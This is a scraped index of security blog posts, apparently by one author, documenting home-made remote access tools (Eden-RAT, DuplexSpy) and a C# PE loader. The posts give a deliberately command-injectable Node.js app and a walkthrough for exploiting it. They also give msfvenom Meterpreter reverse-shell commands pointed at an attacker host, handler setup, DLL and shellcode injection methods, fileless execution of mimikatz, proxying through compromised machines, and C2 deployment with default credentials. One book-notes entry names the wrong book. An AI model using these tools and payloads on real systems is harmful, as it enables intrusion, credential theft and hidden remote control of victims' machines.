READING","categories":[{"name":"Studying/RAT","slug":"Studying-RAT","permalink":"https://iss4cf0ng.github.io/categories/Studying-RAT/"}],"tags":[{"name":"Studying","slug":"Studying","permalink":"https://iss4cf0ng.github.io/tags/Studying/"},{"name":"Reverse Engineering","slug":"Reverse-Engineering","permalink":"https://iss4cf0ng.github.io/tags/Reverse-Engineering/"},{"name":"RAT","slug":"RAT","permalink":"https://iss4cf0ng.github.io/tags/RAT/"},{"name":"Malware","slug":"Malware","permalink":"https://iss4cf0ng.github.io/tags/Malware/"},{"name":"Malware Analysis","slug":"Malware-Analysis","permalink":"https://iss4cf0ng.github.io/tags/Malware-Analysis/"},{"name":"Netbus","slug":"Netbus","permalink":"https://iss4cf0ng.github.io/tags/Netbus/"},{"name":"Ghidra","slug":"Ghidra","permalink":"https://iss4cf0ng.github.io/tags/Ghidra/"}],"keywords":[{"name":"Studying/RAT","slug":"Studying-RAT","permalink":"https://iss4cf0ng.github.io/categories/Studying-RAT/"}]},{"title":"[Studying] Inside Different Generations of RATs","slug":"2026-2-18-StudyingRAT","date":"2026-02-18T05:02:44.000Z","updated":"2026-02-27T13:05:42.438Z","comments":true,"path":"2026/02/18/2026-2-18-StudyingRAT/","link":"","permalink":"https://iss4cf0ng.github.io/2026/02/18/2026-2-18-StudyingRAT/","excerpt":"","text":"BackgroundRecently, I have been developing different types of remote access tools (RATs).My interest in RAT development originates from personal curiosity and long-term fascination with how remote control malware works internally. Years ago, when I was a begineer in cybersecurity——and by “begineer,” I truly mean knowing almost nothing beyond simple denial-of-service attempts using the ping command in cmd.exe——I used to download numerous tools from various websites. At that time, I barely understood operational security or the risks involved. However, experimenting with existing tools was, in my case, the only accessible way to explore cybersecurity as a middle school student. Over the years, my perspective has changed. Instead of merely using tools, I become more interested in understanding how they are designed and implemented. Today, I have published several remote access tools for educational and research purposes, such as DuplexSpy and Eden-RAT. Other projects are still under development or being rewritten. Somebody may ask: why develop multiple RATs? What are the differences? Looking back at 2016, when The Shadow Brokers leaked numerous tools allegedly associated with the National Security Agency 1, one important lesson become clear: advanced threat groups often develop multiple implants and remote access tools tailored for different operational stages and objectives. During my own development process, I began recalling the older RATs I had downloaded but never truly understood. Recently, as I have been studying reverse engineering and malware analysis more systemically, I realized this presents and excellent opportunity to revist those historical tools——not to use them, but to analyze and understand their architecture. Cybersecurity has gradually become more complex. The number of domains, tools, and technologies continues to grow, while learning resources can feel fragmented. The gap between begineers and experienced professional seems wider than ever. This is one of the reasons I started publishing technical articles on my blog. While blogging may feel somewhat old-school, I prefer structed and long-form documentation of knowledge. In this series, I will analyze different generations of remote access tools——from early legacy trojans to more modern modular RATs——focusing on architecture, communication protocols, and design evolution from a reverse engineering perspective. ArticlesThe table below lists all articles in this series analyzing various remote access tools.It will be updated continuously as new research is published. RAT Article Netbus Analyzing NetBus Back Orifice Analyzing BackOrifice Sub7 Analyzing Sub7 Beast Analyzing BeastDoor References 1. https://en.wikipedia.org/wiki/The_Shadow_Brokers &#8617; THANSK FOR READING","categories":[{"name":"Studying/RAT","slug":"Studying-RAT","permalink":"https://iss4cf0ng.github.io/categories/Studying-RAT/"}],"tags":[{"name":"Studying","slug":"Studying","permalink":"https://iss4cf0ng.github.io/tags/Studying/"},{"name":"Reverse Engineering","slug":"Reverse-Engineering","permalink":"https://iss4cf0ng.github.io/tags/Reverse-Engineering/"},{"name":"RAT","slug":"RAT","permalink":"https://iss4cf0ng.github.io/tags/RAT/"},{"name":"Malware","slug":"Malware","permalink":"https://iss4cf0ng.github.io/tags/Malware/"},{"name":"Malware Analysis","slug":"Malware-Analysis","permalink":"https://iss4cf0ng.github.io/tags/Malware-Analysis/"},{"name":"Remote Access Tool","slug":"Remote-Access-Tool","permalink":"https://iss4cf0ng.github.io/tags/Remote-Access-Tool/"}],"keywords":[{"name":"Studying/RAT","slug":"Studying-RAT","permalink":"https://iss4cf0ng.github.io/categories/Studying-RAT/"}]},{"title":"[Book] Java Code Audit (Fundamental)","slug":"2026-2-17-JavaCodeAudit","date":"2026-02-17T06:18:55.000Z","updated":"2026-02-21T12:49:54.271Z","comments":true,"path":"2026/02/17/2026-2-17-JavaCodeAudit/","link":"","permalink":"https://iss4cf0ng.github.io/2026/02/17/2026-2-17-JavaCodeAudit/","excerpt":"","text":"El Libro IntroductionThis article is used to keep notes and summaries of the book “C++ Concurrency In Action (Second Edition)”.The content will be continuously updated as I read through the book. ReflectionChapter 4 - Java EEThere are three main versions of Java platform: Java SE (Java Platform Standard Edition) Java EE (Java Platform Enterprise Edition) Java ME (Java Platform Micro Edition) 4.1 - Hierarchy of Java EETerminology JDBC: Java Database Connectivity JNDI: Java Naming and Directory EJB: JavaBean RMI: Remote Method Invocation Servlet: Server Applet JSP: JavaServer Pages XML: eXtensible Markup Language JMS: Java Message Service Java MVCIt was introduced in 1978. Model: It represents an object or Java POJO with data. Controller: It controls logics of Model or View. It inputs data from user to Model. View: Visualization of data in Model","categories":[{"name":"Book","slug":"Book","permalink":"https://iss4cf0ng.github.io/categories/Book/"}],"tags":[{"name":"Book","slug":"Book","permalink":"https://iss4cf0ng.github.io/tags/Book/"},{"name":"Note","slug":"Note","permalink":"https://iss4cf0ng.github.io/tags/Note/"}],"keywords":[{"name":"Book","slug":"Book","permalink":"https://iss4cf0ng.github.io/categories/Book/"}]},{"title":"[Eden-RAT] How to Use Eden-RAT During the Early Stage of Penetration Testing","slug":"2026-2-9-EdenPentestInitialStage","date":"2026-02-09T08:54:33.000Z","updated":"2026-02-18T06:32:53.448Z","comments":true,"path":"2026/02/09/2026-2-9-EdenPentestInitialStage/","link":"","permalink":"https://iss4cf0ng.github.io/2026/02/09/2026-2-9-EdenPentestInitialStage/","excerpt":"","text":"IntroductionThis article shows how to use Eden-RAT in the early stage of penetration testing. Github Repository: https://github.com/iss4cf0ng/Eden-RAT/ DisclaimerThis project was developed out of personal interest in cybersecurity research and education.It must not be used for illegal or unauthorized activities.The author is not responsible for any misuse or damage caused by this software. Getting StartedEnvironmentThe following table describes the experimental environment: Host OS Description 172.23.243.133 WSL Eden-Server (C2 server) 192.168.1.131:3000 Ubuntu x64 Linux server with an RCE vulnerability 192.168.1.125 Windows 10 Eden-Client Vulnerable MachineIn this demonstration, I deployed an Linux server with a simple RCE vulnerability. The server runs a Node.js web service. Below is the Node.js code that contains the RCE vulnerability:12345678910111213141516171819202122232425262728293031//app.jsconst express = require(&quot;express&quot;);const &#123; exec &#125; = require(&quot;child_process&quot;);const app = express();const PORT = 3000;app.get(&quot;/ping&quot;, (req, res) =&gt; &#123; const host = req.query.host; if (!host) &#123; return res.send(` &lt;h2&gt;Ping a host&lt;/h2&gt; &lt;form&gt; &lt;input name=&quot;host&quot; placeholder=&quot;Enter host&quot; /&gt; &lt;button type=&quot;submit&quot;&gt;Ping&lt;/button&gt; &lt;/form&gt; `); &#125; exec(`ping -c 1 $&#123;host&#125;`, (error, stdout, stderr) =&gt; &#123; if (error) &#123; return res.send(`&lt;pre&gt;$&#123;stderr&#125;&lt;/pre&gt;`); &#125; res.send(`&lt;pre&gt;$&#123;stdout&#125;&lt;/pre&gt;`); &#125;);&#125;);app.listen(PORT, () =&gt; &#123; console.log(`Server running at http://localhost:$&#123;PORT&#125;`);&#125;); This web application provides a ping feature used to test network connectivity or resolve domain names.The nutshell of this feature is executing a Linux command. An RCE vulnerability can occur if a malicious user appends a semicolon (;) followed by arbitrary Linux commands to the host parameter: Again, this is a very simple demonstration of RCE vulnerability. In real-world scenarios, RCE vulnerabilities are not always straightforward——just as buffer overflows in operating systems are often more complex. However, for educational purpose, simple is the best! Now, let’s try to exploit this vulnerability using Eden-RAT. Deploy Eden C2 ServerIf you want to know how to deploy your Eden-Server and Eden-Client, please click here. Generate a payloadBoth the encryption and decryption mechanisms are implemented natively (pure implementation).This means the target platform does not require any third-party libraries. If the payload is generated successfully, Eden-RAT will display the raw payload code,Next, switch the combo box selection to Command, then click Copy: Before exploitation, don’t forget to URL-encode the payload! Now, let’s proceed with the RCE exploitation:1/ping?host=github.com;python3%20-c%20............(Your payload) Once the target Linux machine is online, we can execute interactive commands through the virtual terminal: THANKS FOR READING!","categories":[{"name":"Tools/Eden-RAT","slug":"Tools-Eden-RAT","permalink":"https://iss4cf0ng.github.io/categories/Tools-Eden-RAT/"}],"tags":[{"name":"Penetration","slug":"Penetration","permalink":"https://iss4cf0ng.github.io/tags/Penetration/"},{"name":"Pentesting","slug":"Pentesting","permalink":"https://iss4cf0ng.github.io/tags/Pentesting/"},{"name":"Tools","slug":"Tools","permalink":"https://iss4cf0ng.github.io/tags/Tools/"},{"name":"Eden-RAT","slug":"Eden-RAT","permalink":"https://iss4cf0ng.github.io/tags/Eden-RAT/"}],"keywords":[{"name":"Tools/Eden-RAT","slug":"Tools-Eden-RAT","permalink":"https://iss4cf0ng.github.io/categories/Tools-Eden-RAT/"}]},{"title":"[Tool] Eden-RAT——A lightweight Remote Access Tool (RAT) designed for the initial stage of penetration testing","slug":"2026-2-9-ToolEdenRAT","date":"2026-02-09T08:53:54.000Z","updated":"2026-02-18T06:32:48.897Z","comments":true,"path":"2026/02/09/2026-2-9-ToolEdenRAT/","link":"","permalink":"https://iss4cf0ng.github.io/2026/02/09/2026-2-9-ToolEdenRAT/","excerpt":"","text":"PrefaceWhile developing EgoDrop and DuplexSpy, I successfully implemented an interactive shell within a C#-based GUI application. I then recalled one of my earlier projects that had been suspended due to my limited development experience at the time. Therefore, I decided to revisit and complete it. The idea of this project originated when I was learning web penetration testing.When discovering an RCE (Remote Code/Command Execution) vulnerability, we usually demonstrate it with simple Linux commands(e.g., id, whoami, ls, cat /etc/passwd), and that is often the end of the story. However, if we want to conduct further post-exploitation——such as pivoting into the internal network——we may rely on reverse shell tools like metasploit, nc or openssl. Although they are powerful and widely used, they still have certain limitations in practical penetration testing scenario.sTherefore, I decided to develop a GUI-based remote access tool which can be leveraged after achieving RCE, establishing a robust and secure channel with an interactive shell and file manager. Developing and maintaining this tool entirely on my own is challenging due to limited time, resources, and experience. As a result, the project may still contain undiscovered defects or design flaws. If you encounter any issues while using this tool, please feel free to open an issue or contact me. If you find this tool informative or helpful, a star ⭐ will be greatly appreciated. If you are interested in a demonstration of exploitation, please click here. IntroductionEden-RAT is a lightweight Remote Access Tool (RAT) designed for the initial stage of penetration testing.It provides a Graphical User Interface (GUI) with multiple features targeting Linux systems, including a file manager and an interactive shell. The interactive shell enables full command execution, allowing users to run commands such as ssh, apt, pip install, vim, and other interactive programs seamlessly. Github Repository: https://github.com/iss4cf0ng/Eden-RAT/ FeaturesFeaturesEden (Operator) Build Payload Multi Listener Encrypted Channels Infected Machine Information File Manager Display Image Edit, Copy, Move, Paste, Upload, Download, Rename, Datetime WGET Archive: Compress, Extract New: Folder, Text File Process View Service View Connection: Disconnect, Reconnect DisclaimerThis project was developed out of personal interest in cybersecurity research and education.It must not be used for illegal or unauthorized activities.The author is not responsible for any misuse or damage caused by this software. Technical OverviewEden-RAT supprots encrypted communication using either AES/RSA hybrid encryption or TLS. The AES pure implementation is adapted from:https://github.com/bozhu/AES-Python Once a payload successfully connects to the Eden server, it dynamically loads additional modules delivered by the server. These modules are executed via exec() and their class instances are registered within an internal dictionary-based class registry. The overall architecture is illustrated below: Getting StartedEden-RAT consists of three components——Eden-Server, Eden-Client and the payload. The overall architecture is shown as below: All communication channels are point-to-point encrypted. The communication channel between the Eden-Server and the Eden-Client is encrypted using AES+RSA, while a channel between the Eden-Server and the target Linux server is encrypted using either AES+RSA or TLS. Eden-ServerAn Eden-Server is a python-based socket server. It provides multiple listeners for accepting and handling socket session from Eden-Clients and target Linux servers. It forwards messages between infected Linux systems and Eden-Clients, and processes tasks such as adding listener, building payload requested by Eden-Clients. Note that an Eden-Server requires pycryptodome. Available argument: Eden-ClientAn Eden-Client is a C2 user who performs exploitation. All the tasks can only be processed after the Eden-Client connects to an Eden-Server. PayloadA payload is a script which is used for exploitation. All cryptographic algorithms implemented in the payload are written natively. It means the target Linux server doesn’t requires any third-party libraries (such as pycryptodome), but only a compatible runtime environment (e.g., python 3.10). UsageInformation File Manager Shell Process View Service View DemonstrationDeploy Eden C2 ServerBefore starting the C2 server, you need to install pycryptodome:1pip3 install pycryptodome After installing the package, you must generate an SSL private key and certificate::1openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodesMake sure the files are named exactly: key.pem cert.pem Finally, start the C2 server:1python3 eden_server.py -lvvp 4444 Our Eden-Server has been deployed. Start Eden Client and Connect to the C2 ServerThe default C2 user’s credential are:12username = sdksdkpassword = 123456 After logging in successfully, you should see the following message box: Add/Delete a C2 User1python3 eden_server.py --db Note that your input of password is invisible, which is expected. Generate a payloadBoth the encryption and decryption mechanisms are implemented natively (pure implementation).This means the target platform does not require any third-party libraries. InfectionYou can run the payload script directly:1python3 payload.py You can also execute the payload after achieving RCE. If you are interested in a demonstration of exploitation, please click here. THANKS FOR READING","categories":[{"name":"Tools/Eden-RAT","slug":"Tools-Eden-RAT","permalink":"https://iss4cf0ng.github.io/categories/Tools-Eden-RAT/"}],"tags":[{"name":"Code","slug":"Code","permalink":"https://iss4cf0ng.github.io/tags/Code/"},{"name":"C#","slug":"C","permalink":"https://iss4cf0ng.github.io/tags/C/"},{"name":"Python","slug":"Python","permalink":"https://iss4cf0ng.github.io/tags/Python/"},{"name":"RAT","slug":"RAT","permalink":"https://iss4cf0ng.github.io/tags/RAT/"},{"name":"Pentesting","slug":"Pentesting","permalink":"https://iss4cf0ng.github.io/tags/Pentesting/"},{"name":"Remote Access Tool","slug":"Remote-Access-Tool","permalink":"https://iss4cf0ng.github.io/tags/Remote-Access-Tool/"},{"name":"Tools","slug":"Tools","permalink":"https://iss4cf0ng.github.io/tags/Tools/"},{"name":"Eden-RAT","slug":"Eden-RAT","permalink":"https://iss4cf0ng.github.io/tags/Eden-RAT/"}],"keywords":[{"name":"Tools/Eden-RAT","slug":"Tools-Eden-RAT","permalink":"https://iss4cf0ng.github.io/categories/Tools-Eden-RAT/"}]},{"title":"[Tools] dotNetPELoader——A C# PE loader for x64 and x86 PE files.","slug":"2026-2-6-ToolDotNetPELoader","date":"2026-02-06T14:33:48.000Z","updated":"2026-02-22T17:23:24.020Z","comments":true,"path":"2026/02/06/2026-2-6-ToolDotNetPELoader/","link":"","permalink":"https://iss4cf0ng.github.io/2026/02/06/2026-2-6-ToolDotNetPELoader/","excerpt":"","text":"IntroductionRecently, when I was developing a fileless execution method for DuplexSpy RAT version 2, I could hardly find a C#-based x86 PE loader.Most existing implementations I found were x64-only, such as the one developed by Casey Smith Therefore, I decided to develop a C#-based x86 PE loader myself. This console application allows you to load either x86 or x64 PE files into memory.First, it reads the file bytes from the specified file path, then determines the architecture of both the loader and the target PE file. An x64 PE cannot be loaded by an x86 loader, and vice versa. View the GitHub repository here Features Load x86 PE in x86 process Load x64 PE in x64 process Handles relocation and import resolving Fully written in C# If you find this project useful, a ⭐ would be appreciated. Usage123dotNetPELoader.exe --x64 x64_file.exedotNetPELoader.exe --x86 x86_file.exedotNetPELoader.exe --coffee Demonstrationx64 - mimikatz If you try to load an x86 PE while the loader is an x64 loader, an exception will be thrown:1dotNetPELoader.exe --x64 mimikatz x86 - mimikatz 1dotNetPELoader.exe --x86 mimikatz THANKS FOR READING","categories":[{"name":"Tools/dotNetPELoader","slug":"Tools-dotNetPELoader","permalink":"https://iss4cf0ng.github.io/categories/Tools-dotNetPELoader/"}],"tags":[{"name":"C#","slug":"C","permalink":"https://iss4cf0ng.github.io/tags/C/"},{"name":"Documentation","slug":"Documentation","permalink":"https://iss4cf0ng.github.io/tags/Documentation/"},{"name":"PE File","slug":"PE-File","permalink":"https://iss4cf0ng.github.io/tags/PE-File/"},{"name":"Fileless Execution","slug":"Fileless-Execution","permalink":"https://iss4cf0ng.github.io/tags/Fileless-Execution/"},{"name":"PE Loader","slug":"PE-Loader","permalink":"https://iss4cf0ng.github.io/tags/PE-Loader/"},{"name":"x86","slug":"x86","permalink":"https://iss4cf0ng.github.io/tags/x86/"},{"name":"x64","slug":"x64","permalink":"https://iss4cf0ng.github.io/tags/x64/"}],"keywords":[{"name":"Tools/dotNetPELoader","slug":"Tools-dotNetPELoader","permalink":"https://iss4cf0ng.github.io/categories/Tools-dotNetPELoader/"}]},{"title":"[DuplexSpy] Fileless Execution","slug":"2026-2-3-DuplexSpyFilelessExec","date":"2026-02-03T15:42:02.000Z","updated":"2026-02-22T17:23:04.720Z","comments":true,"path":"2026/02/03/2026-2-3-DuplexSpyFilelessExec/","link":"","permalink":"https://iss4cf0ng.github.io/2026/02/03/2026-2-3-DuplexSpyFilelessExec/","excerpt":"","text":"IntroductionThis article demonstrates how to use the Fileless Execution feature of DuplexSpy. This feature allows you to execute a PE (Portable Executable) file on a compromised machine without writing it to disk. PrincipleThe C2 server sends raw PE file bytes to the compromised machine. The DuplexSpy payload loads these PE bytes into memory and executes them. When the payload receives a fileless execution command, it creates a new process to execute the PE entirely from memory. The figure below illustrates the execution flow: The x64 version of PE loader is based on the implementation by Casey Smith. However, I have developed the x86 version in case the C# payload uses the x86 platform. Note that a loader can only execute PE files that match its architecture. An x64 loader cannot execute x86 PE files and vice versa. Make sure you identify the architecture of the target PE and select the matched loader. Getting StartedExample 1 - x64 msfvenomFirst, check the architecture of the executed payload: Generate an x64 Messagebox payload:1$ msfvenom -p windows/x64/messagebox TEXT=&quot;msf hello world&quot; -f exe &gt; x64.exe The x64.exe is executed successfully without being written to disk. This is fileless execution. Next, check the process list: 1tasklist | find &quot;client.exe&quot; Here client.exe is your DuplexSpy payload. Two instance of client.exe (the DuplexSpy payload) are running. One instance maintains communication with the C2 server, while the other is for executing the filesless payload. Example 2 - x86 meterpreter1$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 lhost=192.168.1.192 lport=4444 -f exe -a x86 &gt; x86.exe Example 3 - x86 calc.exeNow, try executing a more complex application: THANKS FOR READING!","categories":[{"name":"Tools/DuplexSpy","slug":"Tools-DuplexSpy","permalink":"https://iss4cf0ng.github.io/categories/Tools-DuplexSpy/"}],"tags":[{"name":"DuplexSpy","slug":"DuplexSpy","permalink":"https://iss4cf0ng.github.io/tags/DuplexSpy/"},{"name":"RAT","slug":"RAT","permalink":"https://iss4cf0ng.github.io/tags/RAT/"},{"name":"Documentation","slug":"Documentation","permalink":"https://iss4cf0ng.github.io/tags/Documentation/"},{"name":"Fileless Execution","slug":"Fileless-Execution","permalink":"https://iss4cf0ng.github.io/tags/Fileless-Execution/"},{"name":"Tools","slug":"Tools","permalink":"https://iss4cf0ng.github.io/tags/Tools/"}],"keywords":[{"name":"Tools/DuplexSpy","slug":"Tools-DuplexSpy","permalink":"https://iss4cf0ng.github.io/categories/Tools-DuplexSpy/"}]},{"title":"[DuplexSpy] SOCKS5 Proxy","slug":"2026-2-3-DuplexSpyProxy","date":"2026-02-03T12:19:31.000Z","updated":"2026-02-22T17:23:30.452Z","comments":true,"path":"2026/02/03/2026-2-3-DuplexSpyProxy/","link":"","permalink":"https://iss4cf0ng.github.io/2026/02/03/2026-2-3-DuplexSpyProxy/","excerpt":"","text":"IntroductionThis article demonstrates how to use the proxy feature of DuplexSpy. This feature allows you to use a compromised machine as a proxy, meaning that all network traffic from your machine can be forwarded through the compromised host. Even if a compromised machine does not store sensitive data, it can still be abused as a proxy or relay node for malicious activities, such as forwarding SSH sessions. This allows threat actors to hide their real origin and reduce the risk of attribution. PrincipleA C2 server starts listening on one or more ports and accepts SOCKS5 connections from proxy users. The C2 server redirects the user’s network stream to a compromised machine, which then forwards the traffic to the target host. All DNS resolution is performed on the compromised machine. UsageIn this example, I demonstrates the proxy feature through SSH and proxychains. The following table describes the experimental environment: Host OS Description 10.98.225.138 Ubuntu VM Target host. It has enabled SSH service. An important file is stored at ~/Desktop/foo.txt. 10.98.222.136 Windows 10 x64 Compromised machine. 10.98.241.11 Debian Kali Linux Attacker machine. 10.98.253.150 Windows 10 Attacker’s C2 server. Start the DuplexSpy C2 server: Right click the compromised host and select Proxy You should use an unused port. Next, establish an SSH connection from Kali Linux to the target host 10.98.225.138. Configure the proxychains:1$ vim /etc/proxychains.conf 1$ proxychains ssh sdksdk@10.98.225.138 Now, check the source IP address on the target host:1netstat -ano | grep &quot;:22&quot; The source address is 10.98.222.136:54372, which belongs to the compromised machine. THANKS FOR READING!","categories":[{"name":"Tools/DuplexSpy","slug":"Tools-DuplexSpy","permalink":"https://iss4cf0ng.github.io/categories/Tools-DuplexSpy/"}],"tags":[{"name":"DuplexSpy","slug":"DuplexSpy","permalink":"https://iss4cf0ng.github.io/tags/DuplexSpy/"},{"name":"RAT","slug":"RAT","permalink":"https://iss4cf0ng.github.io/tags/RAT/"},{"name":"Documentation","slug":"Documentation","permalink":"https://iss4cf0ng.github.io/tags/Documentation/"},{"name":"Tools","slug":"Tools","permalink":"https://iss4cf0ng.github.io/tags/Tools/"},{"name":"SOCKS5","slug":"SOCKS5","permalink":"https://iss4cf0ng.github.io/tags/SOCKS5/"},{"name":"Proxy","slug":"Proxy","permalink":"https://iss4cf0ng.github.io/tags/Proxy/"}],"keywords":[{"name":"Tools/DuplexSpy","slug":"Tools-DuplexSpy","permalink":"https://iss4cf0ng.github.io/categories/Tools-DuplexSpy/"}]},{"title":"[DuplexSpy] Using and Developing a Plugin.","slug":"2026-2-3-DuplexSpyPlugin","date":"2026-02-03T12:18:50.000Z","updated":"2026-02-22T17:23:35.441Z","comments":true,"path":"2026/02/03/2026-2-3-DuplexSpyPlugin/","link":"","permalink":"https://iss4cf0ng.github.io/2026/02/03/2026-2-3-DuplexSpyPlugin/","excerpt":"","text":"IntroductionDuplexSpy provides a simple remote plugin manager that allows you to load customized plugins into a compromised machine without writing them to disk. This article describes how to use and develop a custom plugin for DuplexSpy. Note that all plugins are implemented using .NET Framework 4.8 for compatibility reasons. The plugin manager interface provides a GUI ListView and a console. PrincipleThe C2 server sends the raw DLL bytes of plugin assemblies to the compromised machine. The payload loads these assemblies into memory using the Assembly.Load() method and stores their interfaces in a read-only dictionary. The payload can invoke plugin interfaces and pass parameters whenever it receives commands from the C2 server. When the payload is terminated, all loaded plugins are automatically released by the system. UsageThe plugin console provides the following commands: Command Description clear Clear the console output. show List all available plugins under the plugin folder. loaded Show all currently loaded plugins. load &lt;all | plugin name&gt; Load specified plugin. unload &lt;all | plugin name&gt; Unload the specified plugin. &lt;entry&gt; &lt;param1&gt; &lt;param2&gt; ... Use specified plugin with parameters. Example 1 - Coffee1coffee help 1coffee print=1 Note that the Plugin Manager throws an exception if an unhandled exception occurs inside a plugin and displays the corresponding error message. However, the payload itself will not be terminated. Example 2 - Dumper Example 3 - InfoSpyder DevelopmentTo develop a plugin. Firstly, create a new .NET framework 4.8 library project. Any name that you like. This name is regardless for the final result. Add a reference Plugin.Abstractions48: Right click your project -> Add -> Reference Plugin.Abstractions48 Don’t forget to use it in your project. Add the required attributes and properties. The HelpTable is optional but recommended. The Name field must be a unique identifier for the plugin. Add the required functions: At this point, you have successfully developed a custom plugin. Before building the project, install Costura.Fody to ensure that all dependencies are merged into a single DLL, even if no additional NuGet packages are used. Build the DLL file: Right click your project -> Build Move the generated DLL into the .\\Plugins folder of DuplexSpy and create a JSON file WITH THE SAME FILE NAME (important). The JSON file should be structured as follows. The Name field must match the plugin name defined in the code. The Entry field specifies the command name used in the plugin console. The Command field is reserved for future use. Go to DuplexSpy. Open Plugin: Our HelloWorld plugin has been successfully installed. Now let’s try it in the console: Congratulations! You have successfully developed and deployed a custom Duplex plugin. THANKS FOR READING!","categories":[{"name":"Tools/DuplexSpy","slug":"Tools-DuplexSpy","permalink":"https://iss4cf0ng.github.io/categories/Tools-DuplexSpy/"}],"tags":[{"name":"C#","slug":"C","permalink":"https://iss4cf0ng.github.io/tags/C/"},{"name":"DuplexSpy","slug":"DuplexSpy","permalink":"https://iss4cf0ng.github.io/tags/DuplexSpy/"},{"name":"RAT","slug":"RAT","permalink":"https://iss4cf0ng.github.io/tags/RAT/"},{"name":"Documentation","slug":"Documentation","permalink":"https://iss4cf0ng.github.io/tags/Documentation/"},{"name":"Remote Plugin","slug":"Remote-Plugin","permalink":"https://iss4cf0ng.github.io/tags/Remote-Plugin/"},{"name":".NET","slug":"NET","permalink":"https://iss4cf0ng.github.io/tags/NET/"}],"keywords":[{"name":"Tools/DuplexSpy","slug":"Tools-DuplexSpy","permalink":"https://iss4cf0ng.github.io/categories/Tools-DuplexSpy/"}]},{"title":"[DuplexSpy] DLL and Shellcode Injection and Loader","slug":"2026-2-3-DuplexSpyDllAndShellcode","date":"2026-02-03T12:18:07.000Z","updated":"2026-02-22T17:22:52.110Z","comments":true,"path":"2026/02/03/2026-2-3-DuplexSpyDllAndShellcode/","link":"","permalink":"https://iss4cf0ng.github.io/2026/02/03/2026-2-3-DuplexSpyDllAndShellcode/","excerpt":"","text":"IntroductionThis article demonstrates how to use the DLL and shellcode injection features of DuplexSpy. This feature allows you to inject a DLL or shellcode into a target process. DuplexSpy also provides a DLL loader and a shellcode loader, which allows you to execute payloads without injecting them into an existing process. If you would like to learn more about DLL and shellcode injection techniques, you can refer to the notes I wrote for studying reverse engineering and Windows buffer overflow. InjectorThis features allows you to inject a DLL file or shellcode in a specified process. However, due to Windows security protections, this method may not always work. Note that the DLL file or shellcode must match the architecture of the target process (x86 or x64). An x86 process canoot load an x64 DLL or shellcode, and vice versa. DuplexSpy provides the following injection methods for both DLL and shellcode: APC Early Bird CreateRemoteThread (default) NtCreateThreadEx ZwCreateThreadEx Before performing an injection, you should determine the architecture of the target process. An x86 DLL cannot be injected into an x64 process, and vice versa. On x64 systems, PE files uder C:\\Windows\\System32 are typically x64 binaries, while PE files under C:\\Windows\\SysWOW64 are x86 binaries. Getting StartedDLL InjectionNotice that this method IS NOT fileless. A DLL file will be created under %TEMP% directory and might be detected or deleted by antivirus software. The CreateRemoteThread method is recommended for DLL injection. In this example, Kali Linux is used to establish a Meterpreter reverse TCP connection via DLL injection. Field Value Target process C:\\Windows\\SysWOW64\\notepad.exe Kali host 192.168.1.192 Kali port 4444 Build an x86 payload using msfvenom:1$ msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.192 lport=4444 -a x86 -f dll &gt; x86.dll Msfconsole:123456$ msfconsolemsf&gt; use exploit/multi/handlermsf&gt; set payload windows/meterpreter/reverse_tcpmsf&gt; set lhost 192.168.1.192msf&gt; set lport 4444msf&gt; run CreateRemoteThreadLet’s try the CreateRemoteThread method: Notice that the log messages in the box are not always reliable. A DuplexSpy payload cannot check your msf payload! Next, exit your meterpreter session:1meterpreter&gt; exit Process notepad.exe is still running! NtCreateThreadExNtCreateThreadEx method: It works again ( . 3 .) ZwCreateThreadEx Shellcode InjectionThis method is fileless. The CreateRemoteThread method is recommended for shellcode injection. Use the following command to generate a meterpreter shellcode:1msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f c Paste the output into the shellcode editor of DuplexSpy. Click the “Formatting” button at the top of the window form. You can also click the “Save” button, DuplexSpy automatically runs the “Formatting” function. Formatting CreateRemoteThread NtCreateThreadEx ZwCreateThreadExLastly, let’s try the ZwCreateThreadEx method. LoaderDuplexSpy allows you to load a DLL file or shellcode directly without injecting it into an existing process. As with injection, the payload architecture must match the loader architecture (x86 or x64). For performance reasons, DuplexSpy creates a new process for both DLL and shellcode loading. This behavior is similar to the fileless execution features of DuplexSpy; however, the loader architecture cannot be selected manually. If the DuplexSpy payload is x64, only x64 DLLs or shellcodes can be loaded. DLL LoaderNote that this method is not fileless. Shellcode LoaderDuplexSpy allows you to load shellcode into memory. It is a fileless method. THANKS FOR READING!","categories":[{"name":"Tools/DuplexSpy","slug":"Tools-DuplexSpy","permalink":"https://iss4cf0ng.github.io/categories/Tools-DuplexSpy/"}],"tags":[{"name":"DuplexSpy","slug":"DuplexSpy","permalink":"https://iss4cf0ng.github.io/tags/DuplexSpy/"},{"name":"RAT","slug":"RAT","permalink":"https://iss4cf0ng.github.io/tags/RAT/"},{"name":"Tool","slug":"Tool","permalink":"https://iss4cf0ng.github.io/tags/Tool/"},{"name":"DLL Injection","slug":"DLL-Injection","permalink":"https://iss4cf0ng.github.io/tags/DLL-Injection/"},{"name":"Shell Injection","slug":"Shell-Injection","permalink":"https://iss4cf0ng.github.io/tags/Shell-Injection/"},{"name":"DLL Loader","slug":"DLL-Loader","permalink":"https://iss4cf0ng.github.io/tags/DLL-Loader/"},{"name":"Shell Loader","slug":"Shell-Loader","permalink":"https://iss4cf0ng.github.io/tags/Shell-Loader/"}],"keywords":[{"name":"Tools/DuplexSpy","slug":"Tools-DuplexSpy","permalink":"https://iss4cf0ng.github.io/categories/Tools-DuplexSpy/"}]},{"title":"[Tools] DuplexSpy v2.0.0","slug":"2026-1-28-ToolsDuplexSpy-v2-0-0","date":"2026-01-27T16:29:37.000Z","updated":"2026-02-22T17:23:16.723Z","comments":true,"path":"2026/01/28/2026-1-28-ToolsDuplexSpy-v2-0-0/","link":"","permalink":"https://iss4cf0ng.github.io/2026/01/28/2026-1-28-ToolsDuplexSpy-v2-0-0/","excerpt":"","text":"PrefaceThis document describes DuplexSpy (also referred to as DuplexSpyCS, where CS stands for C#). If you are reading this document, I am glad to announce the release of DuplexSpy version 2, after more than six months of the version 1. During this period, I struggled with various emotional and academic issues, which once led me into depression. Fortunately, I managed to overcome one of my biggest personal challenges (even though it might seem trivial to others). As a college student, developing a GUI-based remote access tool entirely on my own—and performing proper quality assurance (QA)—has been a significant challenge for me. Due to limited time, experience, and resources, this project may still contain defects or design flaws that I have not yet discovered. Nevertheless, I believe that I have successfully built a RAT that incorporates a variety of offensive techniques and practical features. If you find this project helpful or informative, I would truly appreciate a ⭐ on the repository. Your support would be a great motivation for me to continue improving 